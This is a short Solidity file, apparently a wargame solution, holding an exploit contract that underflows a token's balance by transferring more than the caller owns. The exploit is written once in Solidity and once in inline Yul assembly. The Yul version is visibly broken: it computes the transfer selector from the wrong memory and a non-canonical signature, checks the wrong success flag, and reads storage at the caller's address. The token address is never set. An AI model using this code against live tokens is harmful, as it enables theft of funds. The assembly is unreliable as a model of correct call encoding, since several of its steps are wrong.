// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Token {
    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenHack {
    Token token;

    function SolidityHack() public {
        uint256 currentBalance = token.balanceOf(msg.sender);
        token.transfer(address(0), currentBalance + 1);
        require(token.balanceOf(msg.sender) > currentBalance);
    }

    function YulHack() public {
        assembly {
// startBalance
            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(4, caller())
            let success := staticcall(gas(), sload(token.slot), 0, 0x24, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
            let startBalance := mload(0)

            mstore(0x20, "transfer(address,uint)")
            mstore(0x20, keccak256(0, 22))
            mstore(0x24, 0)
            mstore(0x44, add(startBalance, 1))
            let success2 := call(gas(), sload(token.slot), 0, 0x20, 0x64, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

// endBalance
            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(0x4, sload(caller()))
            pop(staticcall(gas(), sload(token.slot), 0, 0x24, 0, 0x20))
            let endBalance := mload(0)

            if iszero(gt(endBalance, startBalance)) {
                revert(0, 0)
            }
        }
    }
}
